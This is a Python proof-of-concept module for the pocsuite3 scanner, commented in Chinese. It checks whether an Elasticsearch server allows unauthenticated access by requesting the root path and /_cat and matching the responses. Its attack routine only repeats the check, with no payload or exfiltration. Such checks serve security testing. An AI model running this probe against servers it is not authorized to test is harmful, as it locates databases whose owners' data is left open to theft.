#!/usr/bin/env python
#coding=utf-8

import traceback

# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class Elasticsearch_POC(POCBase):
    vulID = 'Elasticsearch-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'Elasticsearch'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE

    vulDate = '2020-04-17'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-17'  # 编写 PoC 的日期
    updateDate = '2020-04-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://github.com/chaitin/xray/blob/master/pocs/elasticsearch-unauth.yml', 'https://www.cnblogs.com/xiaozi/p/8275201.html']  # 漏洞地址来源,0day不用写
    name = 'Elasticsearch未授权访问漏洞'  # PoC 名称
    cvss = u"高危"


    '''
    poc检测两个特征，加强可靠性：
    1，GET访问根路径，返回es的slogan：`You Know, for Search`；
    2，GET访问`/_cat`，响应里有`/_cat/master`
    '''
    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        # 传入True参数，得到host和port，参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/lib/utils/__init__.py
        #host, port = url2ip(target_url, True)  

        # 根路径访问
        ROOT_PATH = '/'
        ROOT_URL =  vul_url + ROOT_PATH

        # /_cat路径访问
        QUERY_PATH = '/_cat'
        QUERY_URL  = vul_url + QUERY_PATH


        try:
            resp = req.get(ROOT_URL)

            # 1, 响应体里是否含有`You Know, for Search`，Content-Type是否为'application/json'
            if resp.status_code == 200 and 'application/json' in resp.headers['Content-Type'].lower():

                resp = req.get(QUERY_URL)

                # 2, 响应码为200 且响应中包含`/_cat/master`
                if resp.status_code == 200 and '/_cat/master' in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = target_url
                    return self.save_output(result)

                return self.save_output(result)
        except Exception as e:
            print(e)
            traceback.print_stack()
        
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        return self._verify()



    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(Elasticsearch_POC)